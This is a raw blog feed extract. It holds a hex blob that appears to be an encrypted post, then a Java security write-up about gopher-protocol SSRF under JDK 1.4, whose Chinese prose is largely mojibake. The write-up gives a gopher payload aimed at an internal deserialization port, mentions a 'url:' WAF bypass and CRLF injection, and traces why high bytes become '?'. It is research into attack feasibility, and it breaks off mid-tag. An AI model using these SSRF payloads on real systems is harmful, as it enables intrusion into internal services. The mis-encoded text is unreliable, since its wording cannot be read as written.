6dd2965759ecb7e5794a9d61133030a45a2ee0f34efd0c93695c9a25e25f33e105d8f9f7cd4a632cc58ef43541762d1e97e5230d0e2f103cc27262c60fb869e1d958e2ab4d2f133353d15118f139f929b3e86771fef62502b4911e971a1a7673bc307a423702083e05ee5c0fceb5550c4e1a182444e1a350bc31899d44b7755a2c524385d308a0c88bb047033a7e514c8a8b6cb9f49469e03b74a3223940fc471ed1e65d03d0c13785e38f594dde9543a2ef9e6e09968349cc01cee3791e9eb1ac15de73221ae882e6350c4084e5b249ce9828b9817d1e29d0568b5ca6038b621d7c5f66f5eb531cf9238ed4e2c7f57b7691400d936a0193084a81c72f0b2b037ce7443ca2fb62d73061e740439a17189cac061ce07e00a0dcce11b861da81f87e3171f44746efb8c75f68ed7c5f94e6d7eec0a559792056251742cf5b5f87235010b361e0fb2f4c1c42f199f00fba3b6f3a2bd63fd7d1ef3064984dafefd48602a98a8450dc67b692a7dcd56d9f01e0ffd6f9b32d9936d02190350a48acdc93108d84d27b56b1d56d762abf0df6d362b0bd397520e97e9da8e73959637372c14bbe3dd6a123d67effae22ac4cf6a40166386f073b1578b6269bd958143650d4ab5f2816393f83236876d6e6a0326bce905b45d04db30f39e462b7d4533e09111c8dc5b7e19ed2693a05718cc15d8e274cc7dfa273d7637c0cf6f9c2312d49ec8787001edd75ae75f16d793323ef83e3acec046e89792deb1e3ecb846a5446a9e9451d6e2a5e61a1e2bff034cd9891fbe0c7a02be0747014c5329dce9452e05ab119440e28553c209d36fddf92ac43033bedcffd17589d1413011441281a19e99a81ca90f3f5e5e9c40f5be699433d760886f3213b491689467397f32219ae6ba623a0caf4a9da6f8d4540260f7621d594f497f90886ae0a3751d04003cad6de9ca07d1b45014fb5d3937c8f83fd59262cc1dde83efbfa2f62947c303d5c00c6bb31139d0a5f503932d379387083cdc791d64ffe68d43fe41e39c4412b2869e225b56a99cc72e082845187db840b03f42b9269bdc77d128dd9824b9fe3366ac450564ad5a620bcb773ebabf99914b1034da4842e32d2723118841fd74d4a59ec06b238afc6524fa67250935ac256de1a244a914f513d9fc35a47a3795d47490cf073225477d0440af87a71c2137fd1041e64c67d3df87d980df2c7b558f5ee05c51cb1b4694ecf6f7cff05523148e88bc7c73a57cef4777b7ff7096daf7769bab63082baa414cd34287a4b49e4c6017ebc6075a505a952db09c1c44c274c9bf0da47e5367a1878cf2ed021a9bf5d66d94954552a37a31c5319d04a5e5714a49ee6f2e556a93becd95a4d252a126a5160f013e8770ba78482607a6e505853cb570166d494d4fdace755cef3fdf77fe205de4fd3b09a1f6cfb6d62069ee3dccc907852e063529f5b2f6ed6a93728f3b5e75d0d8045e611bb9323d747ec0a99470aee5702b3c82aee81f8f3c34557eda54ee24d46a4c7596b3a65a122b86b0196d1b2dcc863d17a1bb885bd8e36a38388d94431400b6b44357c1169baac72d26456445a2ec3f48b06ef242a838025f37d753972e071f315232a53665efdf7305ed5f0d13a183aa85c1e4864aeec30b281c29379c82e093d9a44e642b5987caac23eeb188867a438fb01e3f877d859cde93ac1c82d184f5ce3e70b24e772f794ed4c60cd388b2efd960b301c99934f4b35071ff62ebe505ebd67615cfe61ba19414391969b72f4344dc033b1851bffa3e3cd7f019b1b32c57eb0084683da62b15fbb2d45b83f71e7fe1f299a39b898b9f9b7fcc60095c6321ba0daba139bf772326de17308be5b20a90c74806af4a1f4682e60c9804a79ede772ccfa12f7ff94f37d9cc2463b2c3355fb53ebf6e050baf409c9f3df15bb2d4c3cdbff8d5f296367aee3547ff7150f7b4826a8c04bb482bc59a07e6a681f3f8d9ff539a3b68555ba880d985da797e5c8fa483ef2cb966171f7de84eebe6e1aa34f4422ce2c5a86d65afef807b083eedf555acffcfd6b80a74d6178e1f4ad4a49b8f012d977b2e6543d495db875d39d85073bfc011f052b362fa6b030cf8e57c39ad9de72d990b764661379d6dfdba74de0c44eaf99d917b28fe1f8556b9a162f00e8f35fbd72dca021889ae44151bdba04d41ee0eeeda4e14bffe39491b7ae3a556ec3e5ed87de2d811008f89d5614df257c9cfaf43eab37f44e55c34bb095ada5a56089f6014da77710b37136fa3615debaf7bd04b5664b8559dd7af3b6cf946db7ba5cbf58f30bb2be97b8f9b0c23db403e66adf8c80a9f4733002358f7ce6cb35f92e684debfcaff7c80a4046cc9976c61b22dd07bc2d181aadb60d256b8eb5d6ec6f493e0c8bf2519704462886630848aede41ad8c78f05acf56ccbd9f2ef994c59658907b9880019e14f8033e1c4d10e08a9aebd7df6c2d8bff6f76d2939d7ed39a560d2660bc45350c50e9b792b491467eade2533b040b633d9e3d9a90c227201725565b10615f3501f26e136ffeb6175066023b7d9ac112bd67c5747461037ae67e5e93c9e3b9e34b76aec0b805918555819641c4798873a32735b7cf54593e59f59edd56fbfa04b365198ecc9cd346168b37f3a54bb9b9b61234fb349bcb9dd4aac91c90a7e7a98280d0040d3de9a6fac6d85f06ec5d9b10f6f5d7f0154de504d118cfa1138b9f3fb9e0cf11ca985e3282012389cf6d65835f91b9ddf740a731288cd7f39e85657dbda7ee4167388a9e589c1eca20335102d1ce853e2ee5007a2c08fd828ed50aebe034cbe19257ef93d471bde0f2dfde941cb8a0e9391f3db7da2489433bf2165d55dc7e277ce79b0989898b036e1b0313978c770cf258652b285640f90c6d7d27ec54c37c22bcb5f9167102f024fe49ede33adaf0a719d81c3c215df50b5753ca593352bbfd405e203c78660cb34c4b4651c8b78c539107bb94a5090d44de577677401cb24e6f437b83a0ec3edfe9f765ffe0f56c4f81541f156ddc01499d372fa48644569984ade969221b92d117713d6d8f871dd568fd49783cc5922bb24b261560f8910dbd244d01e1424bc8c01f0cb06a607c6d677285c4d1be84e539b6cb83bc498aff71a305cbac558aac77a52fdb919ace9f069f5a274ef36a547f66f24eeb5695267032bded611c4f42c511041d78dfc969cdde1c0810f7a0ea1655f716a2796529e96f9fbd76659a8f837cbdc4a3d0eacd8a27a61384265c49bbd0c27edad195de15b7b4600fbbfea1b7872bc07fd5ef58b4ea5df37d2e9479c9cd4750dc49e209a2b5dc7de6ae7e7ce50f2ac9db7d36283c780adcf39eb2a682b2c860ea974de44053b3034506536e9545266c32a35a962def7b36b2f02390775918fdd7a7ecbfc3d7fed5d41627822f2a0ca0cb9a157f16fa8f1d2b206a7b5020f3fb16d8fcc59b5802dcb11e676ca561851e590a75311381cf29cc09eab56a67372c57dcc8401f2c4422ca4ed0aee921c83162e43fadb64d6c53c005177112a40c86f5855fde033aca732efe80161ae97f68026e25ea9d574bc73de93d8873a48a261cedb65524c4a9a6fa646e38d7bbc91a9fba88e156aa6e12440c4151fb0d1403191a18c1d616b9415a691a259444291153f85a335da30af60e7d76058980270c08d42999f3c7e4c4e8c404e9f13baecbe250d797ea4c04c87604d93fd80e1114668b715d2206359a7c673d36d6fbb53c52d07fbbbd03d9f9f19bf491ce5bf7ccd9143584b5544a3205f674cd76571b7b2335a62691b805fdad3eca226713e3ec0dc6eda5f4611253e02f5c89ccb1b9da372ede313258dde11b605d6ec019ff3421dd43614ddc5defa5f010f91f315b3baed831b9b4eb82471a049074ad008ec08ee5ae491d0101f2ce179e9c61fcef20da68d976718cbb71e2e014213c4e1042e00bfcb83727aaf6be2376d9ce3e3f94c9ace5f3de831858e484016c40f8d499bf6730f0ea5f9fdfc173032972ef25eb82add12f36269e2720f836c01829ea72ba86048068c5a41a0b2755e827db45c9fe6415b8efa6b53957f467fa8bdd27103277bc93123aa81eef92c97319cb5a781737ad9adb1abf03e4e9a49c1c6974118a6e9397d95d3676c472f42f401048bdef397176e6022d97f4387d57e85f5d86f6e5d4c313dd73317f401cb25f2691ef99efbd0deb86b1492c309e5e0415506522fdd953343aef83e51adac43a44430426c1be812ff08cea0e2f84f0062a854ecb60d55b539f3009e4eaf21fee666f0ffc077da3c4af15753f29ba743f968e9bd8a59dd677e2dc8f0ab23732c0e0c6f604470c8b2fe645e51964bcdf413ce350da8ca1945fa342e73467f3d5b54175fc5ae96328d6e7010fccfd701184caf293b6d9155bea9eee212b5b453ec37cb70ff0dee7167a9febdc728f4aa7d3136ba8937fb33819f254d8cce1d52ad74a0e3dd1e326c32f1df0ac33ca53c702e962febe25bb4fd0a7ace8e4ccc28a2e9ea2e6040adb8026d82fa82297f880ce6f3e8676304766f4fa20812448e48e5cd3ab60d22e08cdbb6dfdbe2f8ab2f37a9be6fc01e2bb989a09aa2bc6aea3188289fd88acec96ca7783df6f893f186e375c12295dd93287bccb56258459b4e311550fbd652b7733b6e5dbd3b579ff7fe56149fd889b67a121894ca401aac19623df19d24dc09bba4869084415098ae07693cd242916f11ea0d9c4df21171eaffd8ddddfa86d226a42c99084fbc507371163369330d6774847102909b3a2306ab7d10658d8ac69c87bbce46bd1c8aa65d6b56e2b7be976408a2c866bc8df277094f420ed36b7bb5dda1121b2c958f65b01c551794d081d9b6df154d27531e0122ed56eb5afcdbbef8f8a0ccfb88b7783da2d4b1962ba1659471a278c662fe1633c84a0dc4acdec9f583c150353bfdfe22fb0cdd0f3c2f91cb1859916b20081b29d541869e665503994645caa3b40454176e8686dbd2f57499139912313a42db44fb11ae3fd531265da7ebf93b30abdb51134324a6be27152243bfc2d58da9737519caafb064b450eaed0f53546064bef5074e6c0b8cd63c35d240b9da7e59b4346c2debdb344d4df8f718b9f9ff7fd458fb205750b4a4c3ecfe10b48d244b652291d2d7e5f6da3fedb0321faa086672d749a2d559768c4f2d68a7990c23c080c2940fe50d70c32516c013f1b675896ba733fc07661cd72a7b492f20ee00203f2283e01ebde0c46c001ffb3a2022492e2bab9765959ca10839e4bb1dc6255f9ff8da648e581fb9c871ec46f082d00805272c42ed44baf546032bdb7f352f0a91ca6f3eeda35ea348ca9af518b87fe8e99f43cf8aa1ec6f72ddd5347dbd60d2802e8dbabf734af7d7a7c0c11eefeaa39bae3a1e7bb5e6c666cab9c22c4e2f72f1ed783e9f2b11badaabb54af0432f2578b22aed346eeb001678dafacc2ce0cca912e9f563e6fd75736b48a2b3f711a476aa10fbe93a35b64f21f998b18c28e37cf121b46aa853050ca15a057f213dc15715e8503fc2b2ec177a8088d134d4405f6f8e6f486f2cda8cc91bb6b917033ee9b3150a91b5819f869c98cc2a629aac0a75b84b9014823dbe7cb20ef9e09a232bbc8045d8288b4abbef3a81bc9a36ed939ba04faa66b8a08d9be9da2e9abf3302aa0e416aad26495508a0db713e97aa9109a3b1240cf472ef8bc75efa3f3a44c4d7e9a62ee8575dc397b8b0c890001c1d30c00a8ed4cae4175efa201f9b952bc11f08a738ed4848bb7e94bacc3c91e5a8b303354e9a0ac9c323695345422aeef8fc4b99533127952b357a0a5e939dc6a687ec7e911ca39d7ad996974994b2786cbaaf9ecb3fc4e3b7665ff2ec4ae89b94fd0d3968e867102468af1eff9c1c580c7c809f9a53c500e92cfe7d27f659f66337c298357d6c28961618c2dbebbd834f152b1308fbc102db45c9bb2413695dbf2cb1d5eb8b99342b83864d2bbaa041cdcb6ae180a1bbaffda5e6dc8a4851ad07cbcad824d44120259aecede367d6f340974c70395f22f1d5bbdb5ec648e86dc6010ef97b279c6694a693433d571cc58cee0eee8dbb0014fb438d7546f8ce0a2e3bc1a936eb47e903371fd6884a2d3c8d83800861b7dca4</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½ç‰ˆæœ¬JDKä¸‹gopherçš„å›°å¢ƒ</title>
      <link href="2022/01/10/%E4%BD%8E%E7%89%88%E6%9C%ACJDK%E4%B8%8Bgopher%E7%9A%84%E5%9B%B0%E5%A2%83/"/>
      <url>2022/01/10/%E4%BD%8E%E7%89%88%E6%9C%ACJDK%E4%B8%8Bgopher%E7%9A%84%E5%9B%B0%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€æ¬¡è¸©å‘è®°å½•</p><a id="more"></a><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>  ä¹‹å‰å› ä¸ºå®ä¹ çš„åŸå› ï¼Œå¾ˆå¤šå­¦ä¹ ç¬”è®°æ²¡æ³•å‘å‡ºæ¥ï¼Œå¯¼è‡´åšå®¢é•¿è‰ä¸€æ®µæ—¶é—´äº† ã€‚ç°åœ¨ç¦»èŒåå‘ç¯‡æ–‡ç« æ°´ä¸€ä¸‹(</p><p>  äº‹æƒ…çš„èµ·å› æºè‡ªäºä¸€æ¬¡å®¡è®¡é‡åˆ°çš„åœºæ™¯ï¼Œç›®æ ‡æ˜¯ä¸€ä¸ªjavaå†™çš„CMSï¼Œåªä¸è¿‡javaç‰ˆæœ¬éå¸¸ä½ï¼Œ<code>.class</code>å­—èŠ‚ç æ–‡ä»¶åŸºæœ¬éƒ½æ˜¯1.1/1.4ç‰ˆæœ¬çš„ã€‚ä¸”é£æ ¼ä¸Šæœ‰ç‚¹ä¼ ç»Ÿphp cmsçš„å»ºç«™é£æ ¼ï¼Œå­˜åœ¨å¤§é‡jspæ–‡ä»¶ã€‚æœ€åå®¡è®¡ä¸‹æ¥çš„ç»“æœæ˜¯ï¼Œåªæœ‰ä¸€å¤„å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¸”å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„gadgetã€‚å…¶ä»–æœªæˆæƒçš„æ´åŸºæœ¬åªèƒ½åšåˆ°å†™æ–‡ä»¶ï¼Œsqlæ³¨å…¥æˆ–è€…æ˜¯ssrf.</p><p>  ä¼—æ‰€å‘¨çŸ¥ï¼Œåªæœ‰æ— æ–‡ä»¶è½åœ°+ä¸å‡ºç½‘+æœªæˆæƒRCE+èƒ½æ‰“å†…å­˜é©¬æ‰æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„æœ€ä½³å½¢æ€ã€‚ä¸è¿‡ï¼Œè¯¥åœºæ™¯çš„ä¸€ä¸ªå›°å¢ƒå°±åœ¨äºååºåˆ—åŒ–è§¦å‘ç‚¹ç›‘å¬åœ¨ä¸€ä¸ªæ²¡æœ‰å¯¹å¤–çš„ç«¯å£ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½ç›´æ¥RCEã€‚è¿™æ—¶å€™æƒ³å¿…ç¬¬ä¸€æƒ³æ³•å°±æ˜¯ï¼šâ€œæ¬¸ï¼Œä½ç‰ˆæœ¬çš„jdkè²Œä¼¼æ˜¯å¯ä»¥æ”¯æŒgopherå§ï¼Ÿé‚£ä¸æ˜¯ç›´æ¥å¯ä»¥ssrfæ‰“å†…éƒ¨ç«¯å£è§¦å‘ååºåˆ—åŒ–ä¹ˆï¼Ÿâ€</p><p>  ä½†æ˜¯å½“æˆ‘å°è¯•ä½¿ç”¨gopher ssrfæ”»å‡»æ—¶ï¼Œå‘ç°å¹¶æ²¡æœ‰æ‰“é€šã€‚å¼€äº†ä¸ªç«¯å£ncçœ‹äº†ä¸‹ä¼ è¾“çš„æ•°æ®æµï¼Œå‘ç°å±…ç„¶å‡ºç°äº†å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜.</p><p>  ä»¥<code>gopher://127.0.0.1:9002/_%AC%EDjava</code>ä¸ºä¾‹ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_498b4341f72a58a669f29c388a10ebdc.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_498b4341f72a58a669f29c388a10ebdc.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ååºåˆ—åŒ–æ•°æ®çš„é­”æ•°å¼€å¤´<code>\xAC\xED</code>åœ¨è¿™å±…ç„¶å˜æˆäº†é—®å·ï¼Ÿè¿™ä¸ªæˆ‘è‡ªå·±ä¹‹å‰å¹¶æ²¡æœ‰å¬è¯´è¿‡ï¼Œæ‰€ä»¥å¹²è„†æ¥è°ƒè¯•ç ”ç©¶ä¸‹å§</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è°ƒè¯•è¦ç‚¹æ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ã€‚ä½†æ˜¯è¿™æ¯•ç«Ÿæ˜¯â€œè¿œå¤æ—¶æœŸâ€çš„jdk1.4,å¦‚æœæŒ‰ç…§æ­£å¸¸æµç¨‹è°ƒè¯•ä¸€äº›åº•å±‚å‡½æ•°çš„è¯ï¼Œå¤§æ¦‚ç‡ä¼šç¢°åˆ°å­—èŠ‚ç è¡Œæ•°å¯¹ä¸ä¸Šçš„é—®é¢˜å¯¼è‡´æ–­ç‚¹ä¸‹ä¸ä¸‹æ¥æˆ–è€…æ˜¯è·Ÿçš„è¡Œæ•°ç›´æ¥é”™äº†çš„é—®é¢˜ã€‚æ‰€ä»¥è¿˜æ˜¯è€è€å®å®æŠŠç¯å¢ƒçš„jdkæ‹–å‡ºæ¥å§ :face_with_finger_covering_closed_lips: </p><p>æˆ‘ä»¬çŸ¥é“æ— è®ºæ˜¯javaçš„xxeå¯¼è‡´çš„ssrfè¿˜æ˜¯æ™®é€šçš„ssrfæœ¬è´¨ä¸Šéƒ½æ˜¯å…ˆæŠŠæˆ‘ä»¬è¾“å…¥çš„urlç”¨æ¥å®ä¾‹åŒ–ä¸€ä¸ª<code>URL</code>å¯¹è±¡ï¼Œç„¶å<code>URL#openConnection()</code>æˆ–è€…æ˜¯<code>URL#openStream()</code>ï¼Œå…¶ä¸­<code>openStream</code>å°±æ˜¯<code>this.openConnection().getInputStream()</code>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œä¸‹æ–­ç‚¹çœ‹ä¸‹</p><p>é¦–å…ˆå…³æ³¨ä¸‹ï¼Œåœ¨ç”¨URLå®ä¾‹åŒ–æ—¶ï¼Œé¦–å…ˆä¼šå°è¯•æ ¹æ®urlæ ¼å¼æ¥è§£æå‡ºå¯¹åº”çš„éƒ¨åˆ†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_7d39f4f53e11948b220315ff995450e6.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_7d39f4f53e11948b220315ff995450e6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¡ºä¾¿ä¸€æï¼Œè¿™é‡Œä¹Ÿå‡ºç°äº†java ssrfå¸¸è§çš„ä¸€ä¸ªç»•wafçš„æ–¹å¼<code>url:</code></p><p>è§£æå‡ºå¯¹åº”çš„protocol <code>gopher</code>åï¼Œä¾¿ä¼šå°è¯•è°ƒç”¨<code>getURLStreamHandler</code>ä¸ºè¿™ä¸ªåè®®å»è·å–å¯¹åº”çš„handler,</p><p><code>getURLStreamHandler</code></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_a8a7b9ac0fef861b6be73a19e68483f9.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_a8a7b9ac0fef861b6be73a19e68483f9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸€èˆ¬æƒ…å†µä¸‹handlersé»˜è®¤æ˜¯ç©ºçš„ã€‚<br>æ‰€ä»¥é€šè¿‡è§£æå‡ºæ¥çš„åè®®ï¼Œjavaä¼šåŠ¨æ€æ‰¾å¾—åˆ°å¤„ç†gopherçš„handler<br><code>sun.net.www.protocol.gopher.Handler</code>ã€‚é¡ºä¾¿æŠŠè¿™ä¸ªhandleræ”¾åˆ°ç¼“å­˜ä¹Ÿå°±æ˜¯<code>handlers</code>å˜é‡é‡Œé¢å»ã€‚</p><p>åœ¨å¯¹urlè§£æï¼Œæ£€æŸ¥å®Œæˆåï¼Œå°±åˆ°äº†<code>openConnection</code>çš„é˜¶æ®µã€‚è¿™é‡Œåˆ™ä¼šå»è°ƒç”¨å¯¹åº”handlerçš„openConnection<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_8924a172e3968a3b8e6c988b2a51a7a4.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_8924a172e3968a3b8e6c988b2a51a7a4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>gopher handler æ‰€åšçš„ä¹Ÿåªæ˜¯æŠŠurlå¯¹è±¡ä¼ ç»™<code>GopherURLConnection</code>å®ä¾‹åŒ–</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_58aa5b0b321815cbbe71c6a29e12dc10.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_58aa5b0b321815cbbe71c6a29e12dc10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥å®é™…ä¸Šåœ¨<code>getInputStream</code>è¿™æ‰çœŸæ­£å¼€å§‹å‘åŒ…ã€‚è°ƒç”¨çš„æ˜¯<code>GopherClient</code>çš„<code>openStream</code>ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_1341264dd04c4a6749c5feab0c728f9a.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_1341264dd04c4a6749c5feab0c728f9a.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‘åŒ…è¿™éƒ½æŒºæ­£å¸¸çš„ï¼šå»ºç«‹è¿æ¥ï¼Œç„¶åå‘åŒ…ã€‚ç„¶åå°±åˆ°äº†<code>decodePercent</code>è¿™ã€‚(æ­¤å¤„gkeyå³<code>%AC%EDjava</code>)<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5f46b60fcc929a7c89c95d616f571f0f.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5f46b60fcc929a7c89c95d616f571f0f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>char codeå®Œå…¨æ˜¯å¯¹çš„ã€‚ä½†å°±æ˜¯ååæœ€åè¿”å›æ—¶åŒ…è£¹äº†ä¸€ä¸ª<code>new String</code>ã€‚ã€‚ã€‚ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_11efc3d5fd12cd24c28987eb8ec1e103.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_11efc3d5fd12cd24c28987eb8ec1e103.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶å…¶å®è¿™é‡Œå¹¶æ²¡æœ‰å‘ç”Ÿè½¬æ¢ï¼Œè¿™é‡Œè¿”å›å€¼è™½ç„¶å¥—ä¸Šäº†Stringä½†æ˜¯éå†æ—¶ä»ç„¶èƒ½æ‹¿åˆ°æ­£ç¡®çš„charçš„ã€‚çœŸæ­£çš„è½¬æ¢å‘ç”Ÿåœ¨åé¢çš„<code>this.serverOutput.print</code>ï¼Œè°ƒç”¨çš„å°±æ˜¯<code>java.io.PrintStream#write(java.lang.String)</code></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_b65f8b75e06baaecec8b476606391e68.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_b65f8b75e06baaecec8b476606391e68.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>outputstream writeæ—¶ä¼šåœ¨flushBufferè¿™ä¸€æ­¥æ›¿æ¢byte,<br><code>sun.io.CharToByteConverter#convertAny</code></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_efa9edc962c4c6f031e62dc8ff01ae64.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_efa9edc962c4c6f031e62dc8ff01ae64.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¾®å¦™çš„å­—ç¬¦èŒƒå›´.åŒæ—¶å¦‚æœå­—ç¬¦asciiç å°äº128çš„è¯ï¼Œåˆ™ä¼šç›´æ¥è½¬<code>char</code>ï¼Œä¸€æ—¦å­—ç¬¦ä¸åœ¨æœ‰æ•ˆèŒƒå›´ï¼ˆ128ï¼‰ä»¥å†…å°±ç›´æ¥æ›¿æ¢è¯¥æ¯”ç‰¹ä¸º<code>63</code>,å³<code>?</code></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_670372c97dd6b27d7568cbf7b10732bb.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_670372c97dd6b27d7568cbf7b10732bb.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åœ¨å‘ç°gopheråè®®çš„ssrfå¦‚æ­¤ä¹‹åï¼Œè‡ªç„¶ä¼šå»æƒ³èƒ½å¦ç”¨<code>crlf</code>æ¥è§£å†³å‘¢ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“java7/8çš„ä½ç‰ˆæœ¬ä¸‹å°šä¸”å­˜åœ¨crlfæ¼æ´ï¼Œ1.4è‡ªç„¶ä¹Ÿæ˜¯å­˜åœ¨çš„ã€‚ä½†æ˜¯ç¨å¾®è·Ÿä¸‹httpåè®®çš„å‘åŒ…æµç¨‹å°±å¯ä»¥å‘ç°ï¼Œåªæ˜¯æ‰€è°“çš„<code>handler</code>ä¸ä¸€æ ·ã€‚æœ€å<code>getInputStream</code>çš„æ—¶å€™è°ƒç”¨çš„æ˜¯å±äºhttpåè®®çš„<code>HTTPUrlConnection</code>ã€‚ç»§ç»­è·Ÿåˆ°æ·±å¤„çš„è¯ï¼š<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_833165cc8ca6718616040a90ddac4da8.png" class="lazyload" 